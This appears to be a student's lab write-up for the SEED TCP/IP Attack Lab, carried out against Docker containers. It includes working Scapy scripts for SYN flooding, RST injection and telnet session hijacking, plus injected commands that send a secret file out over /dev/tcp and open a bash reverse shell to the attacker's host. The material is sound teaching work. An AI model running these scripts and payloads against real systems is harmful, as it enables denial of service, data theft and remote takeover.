# System-And-Network-Security

**Comprehensive Documentation: TCP/IP Attack Lab (Task 1–4)**

---

## 📑 Lab Overview

This documentation covers the execution and outcomes of all four TCP/IP attacks from the SEED Labs exercise:

* **Task 1:** TCP SYN Flooding Attack
* **Task 2:** TCP RST Injection Attack
* **Task 3:** TCP Session Hijacking
* **Task 4:** Reverse Shell via Hijacked Session

Screenshots and terminal outputs were recorded to validate each stage.

---

## 🚀 Lab Setup

* **Environment:** Docker Compose
* **Victim Server IP:** `10.9.0.5`
* **Client IP:** `10.9.0.6`
* **Attacker IP:** `10.9.0.1`
* **Telnet Port:** `23`

Containers were started with:

```bash
docker compose build
docker compose up -d
```

---

## 🔪 Task 1: TCP SYN Flooding Attack

### Python Script (synflood.py)

```python
from scapy.all import *
from ipaddress import IPv4Address
from random import getrandbits

ip = IP(dst="10.9.0.5")
tcp = TCP(dport=23, flags="S")
pkt = ip/tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))
    pkt[TCP].sport = getrandbits(16)
    pkt[TCP].seq = getrandbits(32)
    send(pkt, verbose=0)
```

### C Version (synflood.c)

Compiled and run:

```bash
gcc -o synflood synflood.c
./synflood 10.9.0.5 23
```

### Verification:

```bash
netstat -tna | grep SYN_RECV | wc -l
```

**Output:** 129 SYN\_RECV connections confirmed

### SYN Cookie Defense:

```bash
sysctl -w net.ipv4.tcp_syncookies=1
```

Still 129 SYN\_RECV entries → system under pressure.

**Screenshot:** \[Included: SYN\_RECV count & code execution]

---

## 🚧 Task 2: TCP RST Attack

### Objective:

Kill an existing telnet session using a forged RST packet.

### Script (rst\_attack.py):

```python
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=40328, dport=23, flags="R", seq=93)
pkt = ip/tcp
send(pkt, verbose=1)
```

### Result:

Session terminated. Verified by client message: `Connection closed by foreign host.`

**Screenshot:** \[Included: packet capture and terminal result]

---

## 🪧 Task 3: TCP Session Hijacking

### Objective:

Inject malicious commands into an existing telnet session.

### Observed TCP Parameters (Wireshark):

* SEQ: `2644729563`
* ACK: `644915621`
* SrcPort: `49512`

### Script (t3\_hijack.py):

```python
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=49512, dport=23, flags="PA", seq=2644729563, ack=644915621)
data = "cat secret > /dev/tcp/10.9.0.1/9090\n"
pkt = ip/tcp/data
send(pkt, verbose=1)
```

### Result:

Attacker’s netcat listener received content of `secret` file.

**Screenshot:** \[Included: Wireshark capture and terminal payload send]

---

## 🔧 Task 4: Reverse Shell via Hijack

### Objective:

Launch a reverse shell from the victim to the attacker.

### Listener:

```bash
nc -lnvp 9090
```

### Injected Payload:

```python
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=49512, dport=23, flags="PA", seq=2644729563, ack=644915621)
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
pkt = ip/tcp/data
send(pkt, verbose=1)
```

### Result:

Shell access gained from attacker terminal. Commands like `whoami`, `hostname` worked as expected.

**Screenshot:** \[Included: netcat connection and shell confirmation]

---

## 📊 Summary

| Task   | Objective           | Outcome                           |
| ------ | ------------------- | --------------------------------- |
| Task 1 | DoS via SYN flood   | Queue filled, connections delayed |
| Task 2 | Kill telnet session | Session reset successfully        |
| Task 3 | Inject command      | Secret file content exfiltrated   |
| Task 4 | Persistent access   | Reverse shell obtained            |

All tasks were successfully executed and verified with screenshots and terminal outputs.
